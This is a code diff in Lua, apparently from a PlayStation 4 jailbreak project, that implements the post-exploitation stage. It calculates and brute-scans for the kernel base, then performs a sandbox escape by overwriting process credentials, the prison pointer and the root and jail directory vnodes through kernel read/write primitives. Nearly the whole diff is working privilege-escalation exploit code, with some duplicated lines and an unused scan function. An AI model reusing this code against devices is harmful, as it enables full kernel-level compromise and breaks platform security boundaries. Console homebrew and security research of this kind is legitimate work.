@@ -1633,8 +1633,132 @@ end
 
 
 function post_exploitation_ps4()
-    printf("ps4 is not yet supported for jailbreaking")
-    return
+
+    local evf_ptr = kernel.addr.inside_kdata
+    local evf_string = kernel.read_null_terminated_string(evf_ptr)
+    printf("evf string @ %s = %s", hex(evf_ptr), evf_string)
+
+    -- Get current firmware version
+    local fw = tonumber(FW_VERSION:match("%d+%.%d+"))
+    if not offsets[fw] then
+        printf("Unsupported firmware: %s", FW_VERSION)
+        return
+    end
+    
+    local evf_ptr = kernel.addr.inside_kdata
+    local evf_string = kernel.read_null_terminated_string(evf_ptr)
+    printf("evf string @ %s = %s", hex(evf_ptr), evf_string)
+    
+    -- Calculate KBASE from EVF using table offsets
+    -- credit: @egycnq
+    local function calculate_kbase(leaked_evf_ptr)
+        local evf_offset = offsets[fw].evf_offset
+        return leaked_evf_ptr - evf_offset
+    end
+    
+    -- ELF validation
+    -- credit: @egycnq
+    local function verify_elf_header(kbase)
+        local b0 = kernel.read_byte(kbase):tonumber()
+        local b1 = kernel.read_byte(kbase + 1):tonumber()
+        local b2 = kernel.read_byte(kbase + 2):tonumber()
+        local b3 = kernel.read_byte(kbase + 3):tonumber()
+    
+        printf("ELF header bytes at %s:", hex(kbase))
+        printf("  [0] = 0x%02X", b0)
+        printf("  [1] = 0x%02X", b1)
+        printf("  [2] = 0x%02X", b2)
+        printf("  [3] = 0x%02X", b3)
+    
+        if b0 == 0x7F and b1 == 0x45 and b2 == 0x4C and b3 == 0x46 then
+            print("ELF header verified KBASE is valid")
+        else
+            print("ELF header mismatch check base address")
+        end
+    end
+    
+    -- Brute scan for ELF with Target ID validation
+    -- credit: @egycnq
+    local function find_kbase(leaked_ptr, max_scan)
+        local ELF0, ELF1, ELF2, ELF3 = 0x7F, 0x45, 0x4C, 0x46
+        local static_offset = offsets[fw].evf_offset
+        local static_kbase = leaked_ptr - static_offset
+        local target_id_offset = offsets[fw].target_id_offset
+    
+        printf("Static KBASE guess based on EVF offset (0x%X): %s", static_offset, hex(static_kbase))
+    
+        local page_size = 0x1000
+        local PAGE_MASK = uint64("0xFFFFFFFFFFFFF000")
+        local aligned_leaked = bit64.band(leaked_ptr, PAGE_MASK)
+        printf(" aligned addr = %s", hex(aligned_leaked))
+    
+        for offset = 0, max_scan, page_size do
+            printf(" Scanning offset: 0x%X", offset)
+    
+            local addr = aligned_leaked - offset
+            printf("trying addr = %s", hex(addr))
+            local b0 = kernel.read_byte(addr):tonumber()
+            local b1 = kernel.read_byte(addr + 1):tonumber()
+            local b2 = kernel.read_byte(addr + 2):tonumber()
+            local b3 = kernel.read_byte(addr + 3):tonumber()
+    
+            if b0 == ELF0 and b1 == ELF1 and b2 == ELF2 and b3 == ELF3 then
+                printf(" Found ELF header at: %s", hex(addr))
+    
+                local tid_addr = addr + target_id_offset
+                local tid = kernel.read_byte(tid_addr):tonumber()
+    
+                if tid >= 0x80 and tid <= 0x8F then
+                    printf(" Valid Target ID: 0x%02X at %s — confirmed KBASE", tid, hex(tid_addr))
+                    local evf_offset = leaked_ptr - addr
+                    printf(" Hint: static EVF offset for this firmware = %s", hex(evf_offset))
+                    printf(" You can reuse this offset %s next time instead of scanning.", hex(evf_offset))
+                    return addr
+                else
+                    printf(" Target ID check failed (0x%02X) at %s — continuing", tid, hex(tid_addr))
+                end
+            end
+        end
+    
+        print(" ELF header not found — fallback to static guess")
+        return static_kbase
+    end
+    
+    -- Sandbox escape
+    -- credit: @egycnq
+    local function escape_sandbox(kbase, curproc)
+        local PRISON0   = kbase + offsets[fw].PRISON0
+        local ROOTVNODE = kbase + offsets[fw].ROOTVNODE
+    
+        local offset_p_fd    = 0x48
+        local offset_p_ucred = 0x40
+        local offset_fd_rdir = 0x10
+        local offset_fd_jdir = 0x18
+    
+        local p_fd    = kernel.read_qword(curproc + offset_p_fd)
+        local p_ucred = kernel.read_qword(curproc + offset_p_ucred)
+    
+        kernel.write_dword(p_ucred + 0x4, 0)
+        kernel.write_dword(p_ucred + 0x8, 0)
+        kernel.write_dword(p_ucred + 0xC, 0)
+        kernel.write_dword(p_ucred + 0x10, 0)
+    
+        local prison0 = kernel.read_qword(PRISON0)
+        kernel.write_qword(p_ucred + 0x30, prison0)
+    
+        local rootvnode = kernel.read_qword(ROOTVNODE)
+        kernel.write_qword(p_fd + offset_fd_rdir, rootvnode)
+        kernel.write_qword(p_fd + offset_fd_jdir, rootvnode)
+    
+        print("Sandbox escape complete ... root FS access and jail broken")
+    end
+    
+    -- Run post-exploit logic
+    local proc = kernel.addr.curproc
+    local kbase = calculate_kbase(evf_ptr)
+    printf("Kernel Base Candidate: %s", hex(kbase))
+    verify_elf_header(kbase)
+    escape_sandbox(kbase, proc)
 end
 
 
